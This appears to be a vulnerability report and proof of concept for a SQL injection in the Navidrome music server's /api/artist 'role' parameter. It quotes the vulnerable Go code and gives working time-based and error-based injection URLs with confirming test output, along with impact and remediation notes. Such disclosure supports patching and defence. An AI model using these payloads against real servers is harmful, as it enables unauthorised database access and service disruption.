# CVE-2025-48949 Vulnerability Report

## Overview
- **CVE ID**: CVE-2025-48949
- **CWE**: CWE-89 (SQL Injection)
- **Affected Software**: Navidrome 0.55.0 - 0.55.2
- **Fixed Version**: 0.56.0
- **CVSS Score**: 8.9 (HIGH)

## Vulnerability Details

The vulnerability exists in the `/api/artist` endpoint due to improper input validation on the `role` parameter. The application directly interpolates user input into SQL queries without proper sanitization.

### Vulnerable Code Location
File: `persistence/artist_repository.go`

```go
func roleFilter(_ string, role any) Sqlizer {
    return NotEq{fmt.Sprintf("stats ->> '$.%v'", role): nil}
}
```

The `role` parameter is directly concatenated into the SQL query string using `fmt.Sprintf`, allowing attackers to inject arbitrary SQL code.

### Attack Vector
- **Endpoint**: `GET /api/artist`
- **Parameter**: `role`
- **Authentication**: Required (any authenticated user)
- **Database**: SQLite

## Proof of Concept

### Prerequisites
1. Navidrome 0.55.2 running
2. Valid user credentials

### Exploit Payloads

**Time-based SQL Injection:**
```
GET /api/artist?_start=0&_end=15&_order=ASC&_sort=name&role=albumartist');SELECT LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))--
```

**Error-based SQL Injection:**
```
GET /api/artist?_start=0&_end=15&_order=ASC&_sort=name&role=albumartist');SELECT 1;--
```

### Verification Results

```
[*] Testing: Time-based SQLi (RANDOMBLOB)
[+] VULNERABLE! Time-based SQLi confirmed (delay: 3.43s)

[*] Testing: Error-based SQLi (stacked query)
[+] VULNERABLE! Error-based SQLi confirmed (HTTP 500)

[*] Testing: Union-based SQLi attempt
[+] VULNERABLE! Error-based SQLi confirmed (HTTP 500)
```

## Impact

- Unauthorized access to the backend SQLite database
- Extraction of sensitive user information
- Potential data manipulation
- Service disruption

## Remediation

Upgrade to Navidrome version 0.56.0 or later, which validates the `role` parameter against a predefined list of allowed values.

## References

- https://github.com/navidrome/navidrome/security/advisories
- https://nvd.nist.gov/vuln/detail/CVE-2025-48949
